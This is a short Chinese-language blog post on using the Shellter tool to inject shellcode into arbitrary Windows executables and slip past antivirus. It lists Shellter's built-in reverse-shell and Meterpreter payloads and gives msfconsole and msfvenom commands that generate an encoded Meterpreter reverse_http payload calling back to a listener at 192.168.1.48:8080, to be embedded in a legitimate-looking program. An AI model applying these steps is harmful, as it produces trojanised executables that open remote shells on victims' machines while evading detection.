---
layout: post
title:  "shellter加载自定义payload"
date:   2016-11-22 16:00:01 +0800
categories: MSF
tag: Bypass AV
---

* content
{:toc}


shellter可将shellcode注入到任意exe，隐身模式下原exe功能丝毫不受影响，提供自动模式或手动模式加载，菜鸟和高手都能轻松运用。

shellter自身提供个一些基本的payload，如下


    ************
    * Payloads *
    ************
    
    [1] Meterpreter_Reverse_TCP   [stager]
    [2] Meterpreter_Reverse_HTTP  [stager]
    [3] Meterpreter_Reverse_HTTPS [stager]
    [4] Meterpreter_Bind_TCP      [stager]
    [5] Shell_Reverse_TCP         [stager]
    [6] Shell_Bind_TCP            [stager]
    [7] WinExec
    
   



这里就不详细说，重点说加载自定义的payload，custom_payload

用msf或者cobalt strike等都行，这里用msf的作为例子，如下生成：

    msf > use payload/windows/meterpreter/reverse_http
    
    msf payload(reverse_http) > show options
    msf payload(reverse_http) > set lhost 192.168.1.48
    lhost => 192.168.1.48
    msf payload(reverse_http) > set exitfunc thread
    exitfunc => thread
    msf payload(reverse_http) > generate -E -e x86/shikata_ga_nai -t raw -f Green_m.raw
    [*] Writing 351 bytes to Green_m.raw ...

或者

    msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 8 -b ‘\x00’ LHOST=192.168.1.48 LPORT=8080  -f raw -o /root/Desktop/Green_m.raw

然后Select Payload的时候选择刚刚的生成的Green_m.raw。

***注：本文所做所有测试不保证完全有效，仅供参考。***

[shellter官网](https://www.shellterproject.com/)

转载请注明出处：[https://green-m.github.io/2016/11/22/shellter-load-custom_payload/](https://green-m.github.io/2016/11/22/shellter-load-custom_payload/)
